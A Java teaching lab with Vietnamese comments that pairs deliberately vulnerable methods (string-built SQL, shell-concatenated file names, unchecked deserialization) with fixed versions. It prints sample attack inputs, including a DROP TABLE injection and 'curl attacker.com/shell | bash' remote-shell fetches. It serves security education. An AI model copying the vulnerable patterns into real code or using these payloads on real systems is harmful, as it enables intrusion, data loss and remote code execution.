import java.io.*;
import java.sql.*;
import java.util.Base64;

// =============================================================
//  MỤC ĐÍCH: Học & phân tích lỗ hổng bảo mật Java
//  CẢNH BÁO: KHÔNG dùng code này trên hệ thống thực tế
// =============================================================

// ─────────────────────────────────────────────────────────────
//  1. SQL INJECTION
//  Lỗ hổng: ghép chuỗi trực tiếp vào câu query SQL
//  Attack:  username = ' OR '1'='1
//  Fix:     dùng PreparedStatement
// ─────────────────────────────────────────────────────────────
class UserDatabase {

    // [VULNERABLE] Ghép input thẳng vào SQL → SQL Injection
    public void loginVulnerable(Connection conn, String username, String password)
            throws SQLException {

        String query = "SELECT * FROM users WHERE username='" + username
                     + "' AND password='" + password + "'";

        System.out.println("[SQL] Query đang chạy: " + query);

        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(query);

        if (rs.next()) {
            System.out.println("[SQL] Đăng nhập thành công: " + rs.getString("username"));
        } else {
            System.out.println("[SQL] Sai thông tin đăng nhập.");
        }
    }

    // [FIXED] Dùng PreparedStatement → ngăn SQL Injection
    public void loginSafe(Connection conn, String username, String password)
            throws SQLException {

        String query = "SELECT * FROM users WHERE username = ? AND password = ?";
        PreparedStatement stmt = conn.prepareStatement(query);
        stmt.setString(1, username);
        stmt.setString(2, password);

        ResultSet rs = stmt.executeQuery();

        if (rs.next()) {
            System.out.println("[SQL-SAFE] Đăng nhập thành công.");
        } else {
            System.out.println("[SQL-SAFE] Sai thông tin.");
        }
    }

    public void demonstrateSQLi() {
        System.out.println("\n--- SQL INJECTION DEMO ---");
        System.out.println("Input bình thường : username='admin', password='123'");
        System.out.println("  Query: SELECT * FROM users WHERE username='admin' AND password='123'");

        System.out.println("\nInput tấn công    : username=\"' OR '1'='1' --\"");
        System.out.println("  Query: SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password=''");
        System.out.println("  → Điều kiện '1'='1' luôn đúng, bypass được login!");

        System.out.println("\nInput xóa bảng    : username=\"'; DROP TABLE users; --\"");
        System.out.println("  Query: SELECT * FROM users WHERE username=''; DROP TABLE users; --'");
        System.out.println("  → Xóa toàn bộ bảng users!");

        System.out.println("\n[FIX] PreparedStatement tách biệt data vs query → input không thể phá vỡ cấu trúc SQL.");
    }
}


// ─────────────────────────────────────────────────────────────
//  2. COMMAND INJECTION
//  Lỗ hổng: truyền input người dùng thẳng vào Runtime.exec()
//  Attack:  filename = "file.txt; rm -rf /"
//  Fix:     validate input, dùng ProcessBuilder với args tách biệt
// ─────────────────────────────────────────────────────────────
class FileProcessor {

    // [VULNERABLE] Ghép input vào lệnh shell → Command Injection
    public void readFileVulnerable(String filename) throws IOException {
        String command = "cat " + filename;
        System.out.println("[CMD] Chạy lệnh: " + command);

        Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});

        BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));

        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println("[CMD] Output: " + line);
        }
    }

    // [FIXED] Validate input + ProcessBuilder với args tách biệt
    public void readFileSafe(String filename) throws IOException {
        // Chỉ cho phép tên file hợp lệ (chữ, số, dấu chấm, gạch dưới)
        if (!filename.matches("[a-zA-Z0-9._-]+")) {
            System.out.println("[CMD-SAFE] Tên file không hợp lệ, bị từ chối.");
            return;
        }

        // ProcessBuilder tách command và argument → input không thể inject thêm lệnh
        ProcessBuilder pb = new ProcessBuilder("cat", filename);
        pb.redirectErrorStream(true);
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));

        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println("[CMD-SAFE] Output: " + line);
        }
    }

    public void demonstrateCMDi() {
        System.out.println("\n--- COMMAND INJECTION DEMO ---");
        System.out.println("Input bình thường : filename=\"report.txt\"");
        System.out.println("  Lệnh: cat report.txt");

        System.out.println("\nInput tấn công    : filename=\"report.txt; whoami\"");
        System.out.println("  Lệnh: cat report.txt; whoami");
        System.out.println("  → Chạy thêm lệnh whoami trên server!");

        System.out.println("\nInput nguy hiểm   : filename=\"report.txt; curl attacker.com/shell.sh | bash\"");
        System.out.println("  → Tải và chạy reverse shell từ server attacker!");

        System.out.println("\n[FIX] ProcessBuilder([\"cat\", filename]) truyền filename như 1 argument nguyên vẹn");
        System.out.println("      → Dấu ; không có ý nghĩa shell, không thể inject thêm lệnh.");
    }
}


// ─────────────────────────────────────────────────────────────
//  3. INSECURE DESERIALIZATION
//  Lỗ hổng: deserialize dữ liệu không tin cậy từ người dùng
//  Attack:  gửi object độc hại đã được serialize sẵn
//  Fix:     dùng JSON thay vì Java serialization, validate source
// ─────────────────────────────────────────────────────────────
class MaliciousPayload implements Serializable {
    private static final long serialVersionUID = 1L;
    private String command;

    public MaliciousPayload(String command) {
        this.command = command;
    }

    // readObject() tự động gọi khi deserialize → RCE
    private void readObject(ObjectInputStream ois)
            throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        // Kẻ tấn công nhúng code thực thi vào đây
        System.out.println("[DESER] ⚠ readObject() bị trigger! Đang chạy: " + command);
        // Trong thực tế: Runtime.getRuntime().exec(command) → RCE
    }
}

class SessionManager {

    // [VULNERABLE] Deserialize session token từ input người dùng
    public Object loadSessionVulnerable(String base64Token) {
        try {
            byte[] data = Base64.getDecoder().decode(base64Token);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            return ois.readObject(); // ← Nguy hiểm: không kiểm tra class
        } catch (Exception e) {
            System.out.println("[DESER] Lỗi: " + e.getMessage());
            return null;
        }
    }

    // [FIXED] Dùng ObjectInputStream với whitelist class
    public Object loadSessionSafe(String base64Token) {
        try {
            byte[] data = Base64.getDecoder().decode(base64Token);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)) {
                @Override
                protected Class<?> resolveClass(ObjectStreamClass desc)
                        throws IOException, ClassNotFoundException {
                    // Chỉ cho phép deserialize class trong whitelist
                    String allowed = "UserSession";
                    if (!desc.getName().equals(allowed)) {
                        throw new InvalidClassException("Class bị chặn: " + desc.getName());
                    }
                    return super.resolveClass(desc);
                }
            };
            return ois.readObject();
        } catch (Exception e) {
            System.out.println("[DESER-SAFE] Bị chặn: " + e.getMessage());
            return null;
        }
    }

    public void demonstrateDeser() throws Exception {
        System.out.println("\n--- INSECURE DESERIALIZATION DEMO ---");

        // Tạo payload độc hại và serialize
        MaliciousPayload payload = new MaliciousPayload("curl attacker.com/shell | bash");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(payload);
        oos.close();

        String maliciousToken = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println("Token độc hại (base64): " + maliciousToken.substring(0, 40) + "...");

        System.out.println("\n[VULNERABLE] Deserialize token độc hại:");
        loadSessionVulnerable(maliciousToken); // ← readObject() bị gọi → RCE

        System.out.println("\n[SAFE] Thử deserialize với whitelist:");
        loadSessionSafe(maliciousToken); // ← bị chặn vì không có trong whitelist

        System.out.println("\n[FIX] Các biện pháp phòng chống:");
        System.out.println("  1. Không deserialize dữ liệu từ người dùng");
        System.out.println("  2. Dùng JSON/XML thay vì Java serialization");
        System.out.println("  3. Whitelist class được phép deserialize");
        System.out.println("  4. Ký và xác minh dữ liệu trước khi deserialize");
    }
}


// ─────────────────────────────────────────────────────────────
//  MAIN — Chạy demo tất cả lỗ hổng
// ─────────────────────────────────────────────────────────────
public class VulnerableApp {

    static void printBanner(String title) {
        System.out.println("\n" + "═".repeat(55));
        System.out.println("  ⚠  " + title);
        System.out.println("═".repeat(55));
    }

    public static void main(String[] args) throws Exception {
        System.out.println("╔══════════════════════════════════════════════════════╗");
        System.out.println("║     JAVA SECURITY LAB — CHỈ DÙNG ĐỂ HỌC TẬP        ║");
        System.out.println("╚══════════════════════════════════════════════════════╝");

        // 1. SQL Injection
        printBanner("LỖ HỔNG 1: SQL INJECTION");
        UserDatabase db = new UserDatabase();
        db.demonstrateSQLi();

        // 2. Command Injection
        printBanner("LỖ HỔNG 2: COMMAND INJECTION");
        FileProcessor fp = new FileProcessor();
        fp.demonstrateCMDi();

        // 3. Insecure Deserialization
        printBanner("LỖ HỔNG 3: INSECURE DESERIALIZATION");
        SessionManager sm = new SessionManager();
        sm.demonstrateDeser();

        System.out.println("\n" + "═".repeat(55));
        System.out.println("  TÓM TẮT PHÒNG CHỐNG");
        System.out.println("═".repeat(55));
        System.out.println("  SQLi         → PreparedStatement / ORM");
        System.out.println("  CMDi         → Validate input + ProcessBuilder");
        System.out.println("  Deserialization → JSON + whitelist class");
        System.out.println("═".repeat(55));
    }
}
